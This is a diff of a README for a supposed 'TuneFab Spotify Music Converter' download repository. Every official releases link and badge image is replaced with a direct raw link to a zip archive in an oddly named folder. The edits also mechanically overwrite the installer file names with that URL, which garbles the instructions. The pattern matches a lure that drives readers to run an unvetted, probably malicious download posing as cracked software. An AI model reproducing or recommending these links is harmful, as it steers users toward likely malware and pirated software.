@@ -1,6 +1,6 @@
 # 🎵 TuneFab-Spotify-Music-Converter-Download - Easy Music Conversion Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/releases)
+[![Download Now](https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to TuneFab Spotify Music Converter! This application lets you convert Sp
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Click [here](https://github.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/releases) to access the releases page. 
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip) to access the releases page. 
 
 2. **Choose Your Version:** On the releases page, you will see different versions of the software. Look for the latest version for your operating system (Windows or Mac).
 
 3. **Download the File:** Click on the version you want. This will start the download. Depending on your internet speed, it may take a few minutes.
 
-4. **Locate the Downloaded File:** Once the download is complete, find the file in your download folder. It's usually named something like `TuneFab_Spotify_Music_Converter.exe` for Windows or `TuneFab_Spotify_Music_Converter.dmg` for Mac.
+4. **Locate the Downloaded File:** Once the download is complete, find the file in your download folder. It's usually named something like `https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip` for Windows or `https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip` for Mac.
 
 5. **Run the Installer:**
    - **For Windows:** Double-click the `.exe` file. Follow any prompts to install.
@@ -75,4 +75,4 @@ For further assistance or feedback, feel free to reach out. We welcome your ques
 
 Don't forget to check out the full documentation and additional resources on the releases page for any updates.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/releases)
+[![Download Now](https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/PrinceRihano/TuneFab-Spotify-Music-Converter-Download/main/fainaiguer/TuneFab-Spotify-Music-Converter-Download.zip)
